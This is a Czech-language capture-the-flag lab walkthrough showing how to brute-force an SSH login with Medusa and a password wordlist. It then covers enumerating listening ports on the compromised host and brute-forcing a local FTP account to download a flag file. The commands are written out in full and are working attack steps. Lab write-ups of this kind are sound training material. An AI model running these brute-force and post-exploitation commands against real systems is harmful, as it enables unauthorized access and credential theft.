## 🔒 Vzdálené služby (SSH a FTP)

I když jsou protokoly jako SSH šifrované, spoléhají-li se pouze na tradiční kombinaci uživatelského jména a hesla, zůstávají zranitelné vůči útokům hrubou silou (brute-force). Nekódovaný protokol FTP navíc přenáší veškerá data i přihlašovací údaje v otevřeném textu.

## 🛠️ Postup útoku: Od SSH k lokálnímu FTP

Tato praktická část popisuje dvoufázový útok: nejprve prolomení vnějšího přístupu přes SSH a následně lokální průzkum a prolomení interní FTP služby.

### 1. Fáze: Útok na SSH přes Medusu

Předpokládáme znalost uživatelského jména (`sshuser`) a IP adresy/portu cíle.

Bash

```
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

#### Rozbor parametrů příkazu:

|**Parametr**|**Význam**|
|---|---|
|**`-h <IP>`**|IP adresa vzdáleného cíle.|
|**`-n <PORT>`**|Port, na kterém běží SSH (např. 22 nebo vlastní port instance).|
|**`-u sshuser`**|Cílové uživatelské jméno.|
|**`-P <SOUBOR>`**|Cesta k použitému slovníku hesel.|
|**`-M ssh`**|Volba modulu Medusa určeného pro SSH.|
|**`-t 3`**|Počet paralelně běžících vláken (pokusů).|

**Výsledek:** Medusa najde heslo (v ukázce: `1q2w3e4r5t`), čímž získáte přístup:

Bash

```
ssh sshuser@<IP> -p <PORT>
```

### 2. Fáze: Post-Exploitation & Průzkum interních služeb

Po získání přístupu k shellu probíhá lokální rekognosklace otevřených portů přímo na cílovém stroji:

1. **Kontrola naslouchajících portů (`netstat`):**
    
    Bash
    
    ```
    netstat -tulpn | grep LISTEN
    ```
    
    _Zjištěno, že na portu 21 (FTP) běží lokální služba._
    
2. **Ověření služby (`nmap`):**
    
    Bash
    
    ```
    nmap localhost
    ```
    
3. **Identifikace uživatele:**
    
    Při prohlížení adresáře `/home` naleznete složku `/home/ftpuser`, což indikuje existenci uživatele **`ftpuser`**.
    

### 3. Fáze: Útok na lokální FTP z rozhraní stroje

Jelikož FTP běží lokálně na stroji, útok Medusou směřujeme na `127.0.0.1`:

Bash

```
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

- **`-h 127.0.0.1`:** Cílí na lokální rozhraní IPv4.
    
- **`-M ftp`:** Použije modul Medusy pro FTP protokol.
    
- **`-t 5`:** Zvýšený počet vláken na 5 pro rychlejší průběh.
    

### 4. Fáze: Získání Vlajky (Flag)

Po nalezení hesla k FTP se k serveru připojíte a stáhnete soubor `flag.txt`:

Bash

```
# Připojení k FTP
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

# Ve FTP rozhraní:
ftp> ls
ftp> get flag.txt
ftp> exit

# Přečtení vlajky na lokálním shellu:
cat flag.txt
```